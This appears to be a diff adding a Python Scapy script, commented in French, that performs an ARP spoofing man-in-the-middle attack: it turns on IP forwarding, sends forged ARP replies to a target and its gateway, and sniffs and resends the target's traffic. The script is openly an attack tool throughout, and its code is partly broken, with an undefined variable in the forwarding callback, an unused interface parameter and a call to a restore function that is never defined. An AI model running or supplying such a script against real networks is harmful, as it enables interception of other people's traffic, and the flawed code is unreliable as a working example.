@@ -1,0 +1,50 @@
+from scapy.all import *
+
+def enable_ip_forwarding():
+    # Activer l'IP forwarding sous Linux
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface):
+    # Forger le paquet ARP vers la cible
+    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
+    send(arp_target, verbose=0)
+
+    # Forger le paquet ARP vers la passerelle
+    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
+    send(arp_gateway, verbose=0)
+
+def packet_forwarding(packet):
+    # Fonction de rappel pour transférer les paquets entre les machines
+    if IP in packet:
+        packet[IP].dst = target_ip  # Modifier l'adresse IP de destination
+        send(packet, verbose=0)
+
+def main():
+    # Paramètres réseau
+    target_ip = "192.168.1.2"  # Remplacez par l'adresse IP de la machine cible
+    gateway_ip = "192.168.1.1"  # Remplacez par l'adresse IP de la passerelle
+
+    # Découvrir les adresses MAC des machines
+    target_mac = getmacbyip(target_ip)
+    gateway_mac = getmacbyip(gateway_ip)
+
+    # Interface réseau à utiliser (remplacez par votre interface)
+    interface = "eth0"
+
+    # Activer l'IP forwarding
+    enable_ip_forwarding()
+
+    try:
+        # Lancer l'attaque ARP Spoofing
+        arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface)
+
+        # Mettre en place le filtrage des paquets
+        sniff(filter="ip", prn=packet_forwarding, store=0)
+
+    except KeyboardInterrupt:
+        print("Arrêt de l'attaque ARP Spoofing.")
+        # Restaurer les tables ARP des machines cibles
+        restore_target(target_ip, target_mac, gateway_ip, gateway_mac)
+
+if __name__ == "__main__":
+    main()
